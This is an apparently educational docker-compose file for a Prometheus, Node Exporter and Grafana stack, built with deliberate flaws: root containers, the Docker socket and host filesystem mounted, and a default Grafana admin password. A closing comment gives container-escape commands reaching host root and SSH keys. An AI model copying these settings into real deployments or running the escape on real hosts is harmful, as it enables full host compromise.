services:
  # VULNERABLE: IT Troubleshooting container with dangerous privileges
  # 🚨 This simulates a "convenience" container for IT admins to troubleshoot
  # Common pattern: Give IT "full access" for easier troubleshooting = security disaster
  it-troubleshooting:
    image: ubuntu:latest
    container_name: it-troubleshoot-vulnerable

    # 🚨 SECURITY VULNERABILITY: Running as root for "admin convenience"
    user: "0:0" # root:root - "IT needs full access"

    # 🚨 SECURITY VULNERABILITY: Mount everything for "complete visibility"
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro,rslave
      # 🚨 CRITICAL VULNERABILITY: Docker socket for "container management"
      - /var/run/docker.sock:/var/run/docker.sock

    # Install troubleshooting tools that IT "needs" including Docker CLI
    command: |
      bash -c "
      apt-get update &&
      apt-get install -y curl wget htop procps net-tools docker.io &&
      echo 'IT Troubleshooting container ready - Full admin access!' &&
      echo 'Docker CLI installed for container management' &&
      tail -f /dev/null
      "

    restart: unless-stopped

    labels:
      - "purpose=it-troubleshooting"
      - "team=infrastructure"
      - "vulnerability=excessive-privileges"

  # VULNERABLE: Node Exporter with Docker socket access
  # 🚨 This demonstrates the WRONG way - giving monitoring tools Docker socket access
  node-exporter:
    image: prom/node-exporter:latest
    container_name: node-exporter-vulnerable

    # ✅ These mounts are legitimate and needed for monitoring
    # /proc - Process and system information
    # /sys - System device and kernel information
    # / - Root filesystem (read-only) for disk usage metrics
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro,rslave
      # 🚨 SECURITY VULNERABILITY: Docker socket mount
      # This is UNNECESSARY for monitoring but creates massive security hole
      - /var/run/docker.sock:/var/run/docker.sock

    command:
      - "--path.procfs=/host/proc"
      - "--path.sysfs=/host/sys"
      - "--path.rootfs=/rootfs"
      - "--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)"

    ports:
      - "9100:9100"

    restart: unless-stopped

    labels:
      - "purpose=system-monitoring"
      - "vulnerability=docker-socket-exposed"

  # Prometheus: Collects metrics from Node Exporter
  prometheus:
    image: prom/prometheus:latest
    container_name: prometheus-vulnerable

    command:
      - "--config.file=/etc/prometheus/prometheus.yml"
      - "--storage.tsdb.path=/prometheus"
      - "--storage.tsdb.retention.time=7d"
      - "--web.console.libraries=/etc/prometheus/console_libraries"
      - "--web.console.templates=/etc/prometheus/consoles"
      - "--web.enable-lifecycle"

    volumes:
      - ./prometheus-config:/etc/prometheus
      # 🚨 SECURITY VULNERABILITY: Docker socket mount
      # Prometheus doesn't need this but "admin convenience" adds it
      - /var/run/docker.sock:/var/run/docker.sock

    ports:
      - "9090:9090"

    depends_on:
      - node-exporter

    restart: unless-stopped

    labels:
      - "purpose=metrics-collection"
      - "vulnerability=docker-socket-exposed"

  # Grafana: Visualizes the metrics
  grafana:
    image: grafana/grafana:latest
    container_name: grafana-vulnerable

    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
      - GF_USERS_ALLOW_SIGN_UP=false
      - GF_INSTALL_PLUGINS=

    ports:
      - "3000:3000"

    depends_on:
      - prometheus

    restart: unless-stopped

    labels:
      - "purpose=metrics-visualization"
# CONTAINER ESCAPE DEMONSTRATION:
# ===============================
# 1. Start containers: docker-compose -f docker-compose-vulnerable.yaml up -d
# 2. Access IT troubleshooting container:
#    docker exec -it it-troubleshoot-vulnerable sh
#
# 3. Verify dangerous access:
#    whoami                           # root - unnecessary for troubleshooting
#    ls -la /var/run/docker.sock     # Docker socket access - VERY dangerous
#
# 4. Query Docker to verify access:
#    docker ps                        # List all running containers
#    docker info                      # Get Docker host information
#
# 5. Container escape via Docker CLI:
#    # Create and run privileged container with host filesystem access
#    docker run -it --rm --privileged --pid=host -v /:/hostfs alpine chroot /hostfs bash
#
#    # YOU ARE NOW ROOT ON THE HOST SYSTEM!
#    # Can access everything: /etc/passwd, /root/.ssh/, etc.
#
# 6. Alternative: Direct host access via existing mounts:
#    ls -la /rootfs/etc/passwd        # Host's user accounts
#    ls /rootfs/root/.ssh/            # Host's SSH keys
#
# Result: Complete host compromise from "troubleshooting" container access!
